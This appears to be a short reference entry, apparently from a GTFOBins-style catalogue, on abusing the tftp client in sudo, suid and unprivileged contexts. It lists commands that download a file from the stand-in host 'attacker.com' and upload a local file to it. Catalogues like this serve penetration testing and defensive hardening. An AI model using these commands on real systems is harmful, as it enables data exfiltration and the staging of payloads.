title: tftp
html:
tftp

Download

Context: sudo, suid, unprivileged

tftp attacker.com
get /path/to/input-file

Upload

Context: sudo, suid, unprivileged

tftp attacker.com
put /path/to/input-file
excerpt: tftp Download Context: sudo, suid, unprivileged tftp attacker.com get /path/to/input-file Upload Context: sudo, suid, unprivileged tftp attacker.com put /path/to/input-file
